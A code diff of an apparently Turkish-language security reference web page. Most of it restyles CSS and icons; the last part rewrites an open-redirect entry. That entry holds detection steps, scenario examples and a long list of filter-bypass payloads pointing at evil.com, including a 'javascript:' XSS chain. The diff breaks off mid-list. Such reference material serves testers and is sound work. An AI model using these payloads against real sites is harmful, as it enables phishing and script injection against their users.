@@ -206,34 +206,13 @@
       margin-bottom: 20px
     }
 
-    .search-bar input {
-      width: 100%;
-      padding: 12px 44px 12px 16px;
-      border-radius: 10px;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      background: rgba(0, 0, 0, 0.3);
-      color: #fff;
-      font-size: 14px;
-      transition: all 0.2s
-    }
-
-    .search-bar input:focus {
-      outline: none;
-      border-color: var(--accent);
-      background: rgba(0, 0, 0, 0.4)
+    .search-bar input:focus + .search-icon {
+      color: #fff !important;
+      filter: drop-shadow(0 0 5px var(--accent));
     }
 
     .search-bar input::placeholder {
       color: var(--muted)
-    }
-
-    .search-icon {
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: var(--muted);
-      pointer-events: none
     }
 
     .hero {
@@ -245,12 +224,26 @@
     }
 
     .hero h1 {
-      font-size: 32px;
-      margin-bottom: 12px;
-      background: linear-gradient(135deg, var(--accent), #7c3aed);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text
+      display: inline-block;
+      overflow: hidden;
+      white-space: nowrap;
+      border-right: 3px solid var(--accent);
+      margin: 0;
+      width: 0;
+      font-family: monospace;
+      animation: 
+        typing 2s steps(30, end) forwards,
+        blink-caret .75s step-end infinite;
+    }
+
+    @keyframes typing {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: var(--accent) }
     }
 
     .hero .subtitle {
@@ -451,14 +444,29 @@
 
     .search-bar input {
       width: 100%;
-      padding: 12px 44px 12px 16px;
-      border-radius: 10px;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      background: rgba(0, 0, 0, 0.3);
+      padding: 14px 44px 14px 20px;
+      border-radius: 12px;
+      border: 1px solid rgba(139, 92, 246, 0.2);
+      background: rgba(18, 15, 24, 0.6);
       color: #fff;
-      font-size: 14px;
-      transition: all 0.2s;
-      box-sizing: border-box;
+      font-size: 15px;
+      backdrop-filter: blur(10px);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    .search-bar input:focus {
+      outline: none;
+      border-color: var(--accent);
+      background: rgba(18, 15, 24, 0.8);
+      box-shadow: 0 0 15px rgba(139, 92, 246, 0.2), inset 0 2px 4px rgba(0, 0, 0, 0.3);
+      transform: translateY(-1px);
+    }
+
+    .search-bar input::placeholder {
+      color: #4b5563;
+      font-style: italic;
+      opacity: 0.7;
     }
 
     .search-icon {
@@ -468,6 +476,16 @@
       transform: translateY(-50%);
       color: var(--muted);
       pointer-events: none;
+    }
+
+    .search-icon::before {
+      -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5A6.5 6.5 0 1 0 9.5 16a6.47 6.47 0 0 0 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5s4.5 2.01 4.5 4.5s-2.01 4.5-4.5 4.5z'/%3E%3C/svg%3E");
+      mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5A6.5 6.5 0 1 0 9.5 16a6.47 6.47 0 0 0 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5s4.5 2.01 4.5 4.5s-2.01 4.5-4.5 4.5z'/%3E%3C/svg%3E");
+      background-color: var(--accent);
+      width: 20px;
+      height: 20px;
+      display: block;
+      content: "";
     }
 
     .hidden {
@@ -725,6 +743,58 @@
     #identifierOutput.found {
       color: var(--accent);
       font-weight: 600;
+    }
+
+    .tool-card:hover .tool-title {
+    text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff;
+    animation: glitch 0.3s infinite;
+    }
+
+    .tool-card {
+        transition: transform 0.2s ease-out, border-color 0.2s ease, box-shadow 0.2s ease;
+        transform: translate(0, 0);
+    }
+
+    .tool-card:hover {
+        transform: scale(1.04) translate(0, 0) !important; 
+        
+        border-color: var(--accent);
+        box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
+        background: rgba(139, 92, 246, 0.03);
+    }
+
+    .tool-card:hover .tool-title {
+        color: #fff !important;
+        text-shadow: 0 0 8px var(--accent);
+    }
+
+    .tool-card:hover .tool-icon {
+        color: var(--accent);
+        transform: none !important;
+    }
+        
+        .nav a.active {
+        background: var(--glass);
+        color: #fff;
+        box-shadow: inset 2px 0 0 var(--accent);
+    }
+
+    ::-webkit-scrollbar {
+        width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+        background: #09090b;
+    }
+
+    ::-webkit-scrollbar-thumb {
+        background: #1f1b29;
+        border-radius: 10px;
+        border: 1px solid rgba(139, 92, 246, 0.2);
+    }
+    
+    ::-webkit-scrollbar-thumb:hover {
+        background: var(--accent);
     }
 
     #scrollToTopBtn {
@@ -1099,10 +1169,10 @@
       mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2m-5 18H6V4h7z'/%3E%3C/svg%3E");
     }
 
-    .icon-network-node::before {
-      -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M19 17c1.1 0 2 .9 2 2s-.9 2-2 2s-2-.9-2-2c0-.2.03-.4.09-.58l-3.32-1.66c-.4.16-.83.24-1.27.24s-.87-.08-1.27-.24L7.91 18.42c.06.18.09.38.09.58c0 1.1-.9 2-2 2s-2-.9-2-2s.9-2 2-2c.44 0 .87.08 1.27.24l3.32-1.66c-.06-.18-.09-.38-.09-.58V8.41L6.92 6.83C6.56 7.12 6.1 7.31 5.59 7.42C4.38 7.68 3.2 6.9 2.94 5.69C2.68 4.48 3.46 3.3 4.67 3.04C5.88 2.78 7.06 3.56 7.32 4.77c.07.31.06.63 0 .93l3.68 1.84c.31-.03.62-.04.94-.04h.11l3.68-1.84c-.06-.3-.07-.62 0-.93c.26-1.21 1.44-1.99 2.65-1.73c1.21.26 1.99 1.44 1.73 2.65c-.26 1.21-1.44 1.99-2.65 1.73c-.51-.11-.97-.3-1.33-.59l-3.58 1.79V15c0 .2-.03.4-.09.58l3.32 1.66c.4-.16.83-.24 1.27-.24m-7 0c.55 0 1-.45 1-1s-.45-1-1-1s-1 .45-1 1s.45 1 1 1'/%3E%3C/svg%3E");
-      mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M19 17c1.1 0 2 .9 2 2s-.9 2-2 2s-2-.9-2-2c0-.2.03-.4.09-.58l-3.32-1.66c-.4.16-.83.24-1.27.24s-.87-.08-1.27-.24L7.91 18.42c.06.18.09.38.09.58c0 1.1-.9 2-2 2s-2-.9-2-2s.9-2 2-2c.44 0 .87.08 1.27.24l3.32-1.66c-.06-.18-.09-.38-.09-.58V8.41L6.92 6.83C6.56 7.12 6.1 7.31 5.59 7.42C4.38 7.68 3.2 6.9 2.94 5.69C2.68 4.48 3.46 3.3 4.67 3.04C5.88 2.78 7.06 3.56 7.32 4.77c.07.31.06.63 0 .93l3.68 1.84c.31-.03.62-.04.94-.04h.11l3.68-1.84c-.06-.3-.07-.62 0-.93c.26-1.21 1.44-1.99 2.65-1.73c1.21.26 1.99 1.44 1.73 2.65c-.26 1.21-1.44 1.99-2.65 1.73c-.51-.11-.97-.3-1.33-.59l-3.58 1.79V15c0 .2-.03.4-.09.58l3.32 1.66c.4-.16.83-.24 1.27-.24m-7 0c.55 0 1-.45 1-1s-.45-1-1-1s-1 .45-1 1s.45 1 1 1'/%3E%3C/svg%3E");
-    }
+.icon-network-node::before {
+  -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M13 2L3 14h9l-1 8l10-12h-9l1-8Z'/%3E%3C/svg%3E");
+  mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M13 2L3 14h9l-1 8l10-12h-9l1-8Z'/%3E%3C/svg%3E");
+}
 
     .icon-bug::before {
       -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M19 8h-1.81a5.985 5.985 0 0 0-1.82-1.96l.93-.93a.996.996 0 1 0-1.41-1.41l-1.47 1.47C12.96 5.06 12.49 5 12 5s-.96.06-1.41.17L9.11 3.7a.996.996 0 1 0-1.41 1.41l.93.93A5.985 5.985 0 0 0 6.81 8H5c-.55 0-1 .45-1 1s.45 1 1 1h1.09c-.05.33-.09.66-.09 1v1H5c-.55 0-1 .45-1 1s.45 1 1 1h1v1c0 .34.04.67.09 1H5c-.55 0-1 .45-1 1s.45 1 1 1h1.81c1.04 1.79 2.97 3 5.19 3s4.15-1.21 5.19-3H19c.55 0 1-.45 1-1s-.45-1-1-1h-1.09c.05-.33.09-.66.09-1v-1h1c.55 0 1-.45 1-1s-.45-1-1-1h-1v-1c0-.34-.04-.67-.09-1H19c.55 0 1-.45 1-1s-.45-1-1-1m-6 8c-2.21 0-4-1.79-4-4s1.79-4 4-4s4 1.79 4 4s-1.79 4-4 4'/%3E%3C/svg%3E");
@@ -1155,8 +1225,8 @@
     }
 
     .icon-shield-bolt::before {
-      -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12c5.16-1.26 9-6.45 9-12V5l-9-4m-1 15.5V11H9l3-7v5.5h2l-3 7Z'/%3E%3C/svg%3E");
-      mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12c5.16-1.26 9-6.45 9-12V5l-9-4m-1 15.5V11H9l3-7v5.5h2l-3 7Z'/%3E%3C/svg%3E");
+      -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M12 2c5.52 0 10 4.48 10 10s-4.48 10-10 10S2 17.52 2 12S6.48 2 12 2m0 2c-4.42 0-8 3.58-8 8s3.58 8 8 8s8-3.58 8-8s-3.58-8-8-8m0 2c3.31 0 6 2.69 6 6h-2c0-2.21-1.79-4-4-4V6m0 4c1.1 0 2 .9 2 2h-2v-2Z'/%3E%3C/svg%3E");
+      mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M12 2c5.52 0 10 4.48 10 10s-4.48 10-10 10S2 17.52 2 12S6.48 2 12 2m0 2c-4.42 0-8 3.58-8 8s3.58 8 8 8s8-3.58 8-8s-3.58-8-8-8m0 2c3.31 0 6 2.69 6 6h-2c0-2.21-1.79-4-4-4V6m0 4c1.1 0 2 .9 2 2h-2v-2Z'/%3E%3C/svg%3E");
     }
 
     .icon-tools-cross::before {
@@ -2627,21 +2697,21 @@ Body: { "email": "victim@target.com" }</pre>
         icon: 'icon-link-broken',
         parent: 'vulnerabilities',
         title: 'Open Redirect (Açık Yönlendirme) Zafiyeti',
-        description: 'Kullanıcının kontrol ettiği bir parametre ile uygulamanın kullanıcıyı kötü amaçlı bir harici siteye yönlendirmesi. Phishing ve zincirleme saldırılar için kritik.',
+        description: 'Kullanıcının kontrol ettiği bir parametre ile uygulamanın kullanıcıyı kötü amaçlı bir harici siteye yönlendirmesi.',
         sections: [
           {
             title: 'Özet Bilgi ve Kritik Etki',
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Etki:</strong> Phishing saldırıları, tarayıcıda XSS (<code>javascript:</code> protokolü ile), SSRF zafiyetine yol açan zincirleme saldırılar.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Uygulama, URL'de belirtilen yönlendirme hedefini (Location header) hiçbir güvenlik kontrolü yapmadan kullanır.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Uygulama, URL'de belirtilen yönlendirme hedefini (Location header) hiçbir güvenlik kontrolü yapmadan kullanıldığında ortaya çıkar.</li>
             </ul>`
           },
           {
             title: 'Hızlı Tespit ve PoC Adımları',
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 1: Parametre Taraması:</strong> <code>?redirect=</code>, <code>?next=</code>, <code>?target=</code>, <code>?url=</code>, <code>?continue=</code>, <code>?returnTo=</code> gibi parametreleri arayın. Otomatik tarama için <code>ParamSpider</code> veya <code>waybackurls</code> çıktısını grepleyin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 2: Temel PoC:</strong> Parametre değerine <code>https://google.com</code> gibi bir harici URL verip yönlenip yönlenmediğini kontrol edin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 3: Protokol Trick:</strong> Parametre değerine <code>//google.com</code> veya <code>/\\/google.com</code> verin. Filtre sadece "http" veya "https" kontrolü yapıyorsa bu atlatma çalışabilir.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 1: Parametre Taraması:</strong> <code>?redirect=</code>, <code>?next=</code>, <code>?target=</code>, <code>?url=</code>, <code>?continue=</code>, <code>?returnTo=</code> gibi parametreleri arayın.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 2: Temel PoC:</strong> Parametre değerine <code>https://evil.com</code> gibi bir harici URL verip yönlenip yönlenmediğini kontrol edin.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 3: Protokol Trick:</strong> Parametre değerine <code>//evil.com</code> veya <code>/\\/evil.com</code> verin. Filtre sadece "http" veya "https" kontrolü yapıyorsa bu atlatma çalışabilir.</li>
             </ul>`
           },
           {
@@ -2653,71 +2723,119 @@ Body: { "email": "victim@target.com" }</pre>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Data/Javascript URI:</strong> <code>javascript:alert(document.domain)</code> veya <code>data:text/html;base64,...</code> deneyerek XSS'e çevirmeye çalışın.</li>
             </ul>`
           },
-          {
-            title: 'PoC Örnekleri (Yönlendirme Senaryoları)',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-            <strong>Phishing Senaryosu (Subdomain Trick):</strong> Güvenilir site adını içeren kötü amaçlı bir URL.
-            <pre>https://hedefsite.com/login?next=https://hedefsite.com.kötüamaclisite.com/giris</pre>
-        </li>
-        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-            <strong>Protokol/Kodlama Bypass:</strong> Filtrelemeyi atlatmak için çift eğik çizgi veya ters slash kodlaması kullanma.
-            <pre>https://hedefsite.com/continue?url=//kötüamaclisite.com</pre>
-            <pre>https://hedefsite.com/goto?path=/%5cevil.com</pre>
-        </li>
-    </ul>`
-          },
-          {
-            title: 'Gelişmiş Bypass Payload Listesi',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">1. Slash (/) ve Backslash (\\) Manipülasyonları</strong>
-                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">///evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/\\/\\/evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//\\\\evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/..\\\\/evil.com</code>
-                    </div>
-                </li>
-                
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">2. URL Encoding Teknikleri</strong>
-                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2F/evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%5Cevil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2f%2fevil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%09/evil.com (Tab)</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%20/evil.com (Space)</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%00/evil.com (Null)</code>
-                    </div>
-                </li>
+{
+  title: 'Örnek Open Redirect Senaryoları',
+  content: `
+  <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
+      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">1. Protokol & Karakter Bypass</strong>
+          <span style="display:block;margin-bottom:8px;opacity:0.8;">"http://" kontrolünü atlatmak için çift eğik çizgi kullanımı.</span>
+          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">/login?url=//evil.com</pre>
+      </li>
 
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">3. Nokta (.) ve Domain Doğrulama Hataları</strong>
-                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://www.google.com.evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://evil.com/google.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://evil.com?google.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://google.com@evil.com</code>
-                    </div>
-                </li>
+      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">2. HTTP Parameter Pollution (HPP)</strong>
+          <span style="display:block;margin-bottom:8px;opacity:0.8;">Aynı parametreyi iki kez kullanarak sunucu tarafındaki filtreyi şaşırtma.</span>
+          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?url=target.com&url=https://evil.com</pre>
+      </li>
 
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">4. Diğer Karışık Bypass Örnekleri</strong>
-                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//https://evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http:evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com/</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com//</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/.evil.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//google%00.com</code>
-                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">&lt;&gt;//evil.com</code>
-                    </div>
-                </li>
-            </ul>`
-          }
+      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">3. User-Info & Domain Trick</strong>
+          <span style="display:block;margin-bottom:8px;opacity:0.8;">"@" işaretini kullanarak gerçek siteyi kullanıcı adı gibi gösterip saldırganın domainine yönlendirme.</span>
+          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?next=https://target.com@evil.com</pre>
+      </li>
+
+      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">4. Path Traversal & Slash</strong>
+          <span style="display:block;margin-bottom:8px;opacity:0.8;">Dizin değiştirme karakterleri kullanarak beyaz listedeki domainden dışarı çıkma.</span>
+          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?redirect=https://target.com/..//evil.com</pre>
+      </li>
+
+      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px;border-left:3px solid #a855f7">
+          <strong style="color:#e2e8f0;display:block;margin-bottom:6px;">5. JavaScript URI (XSS Chain)</strong>
+          <span style="display:block;margin-bottom:8px;opacity:0.8;">Yönlendirmeyi doğrudan JavaScript kodu çalıştırmak için kullanma.</span>
+          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;overflow-x:auto;">?url=javascript:alert(document.domain)</pre>
+      </li>
+  </ul>`
+},
+{
+  title: 'Gelişmiş Bypass Payload Listesi',
+  content: `
+  <div style="margin-bottom:16px;padding:12px;background:rgba(59, 130, 246, 0.15);border:1px solid rgba(59, 130, 246, 0.3);border-radius:8px;font-size:14px;color:#e2e8f0;display:flex;align-items:center;gap:10px;">
+      <span style="font-size:20px;">❓</span>
+      <div>
+          <strong>Nasıl Kullanılır?</strong>
+          <div style="opacity:0.8;font-size:13px;margin-top:2px;">
+              Aşağıdaki payloadlar, hedef parametrenin (örn: <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">?next=</code>, <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">?url=</code>, <code style="background:rgba(0,0,0,0.3);padding:2px 5px;border-radius:4px;font-family:monospace">...</code>) <strong>değeri</strong> olarak denenmelidir.
+          </div>
+      </div>
+  </div>
+
+  <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+          <strong style="color:var(--muted);display:block;margin-bottom:8px;">1. Slash (/) ve Backslash (\\) Manipülasyonları</strong>
+          <div style="display:flex;flex-wrap:wrap;gap:5px;">
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">///evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\/\\/evil.com/</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/\\/\\/evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//\\\\evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/..\\\\/evil.com</code>
+          </div>
+      </li>
+      
+      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+          <strong style="color:var(--muted);display:block;margin-bottom:8px;">2. URL Encoding Teknikleri</strong>
+          <div style="display:flex;flex-wrap:wrap;gap:5px;">
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2F/evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%5Cevil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2f%2fevil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%09/evil.com (Tab)</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%20/evil.com (Space)</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%00/evil.com (Null)</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/%0d/evil.com (CRLF)</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">?url=target.com%40evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">?url=target.com%23evil.com</code>
+          </div>
+      </li>
+
+      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+          <strong style="color:var(--muted);display:block;margin-bottom:8px;">3. Nokta (.) ve Domain Doğrulama Hataları {Redirect Parametresini unutma!}</strong>
+          <div style="display:flex;flex-wrap:wrap;gap:5px;">
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com?evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com@evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://www.target.com.evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://evil.com/target.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://evil.com?target.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://target.com@evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com/°evil.com</code>
+          </div>
+      </li>
+
+      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+          <strong style="color:var(--muted);display:block;margin-bottom:8px;">4. Unicode ve IDN Homograph</strong>
+          <div style="display:flex;flex-wrap:wrap;gap:5px;">
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">evil。com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">evil%E3%80%82com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://ⓔⓥⓘⓛ.ⓒⓞⓜ</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil%00.com</code>
+          </div>
+      </li>
+
+      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+          <strong style="color:var(--muted);display:block;margin-bottom:8px;">5. Protokol ve Parametre Manipülasyonu</strong>
+          <div style="display:flex;flex-wrap:wrap;gap:5px;">
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">target.com&url=evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https;evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http:evil.com</code>
+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil%00.com</code>
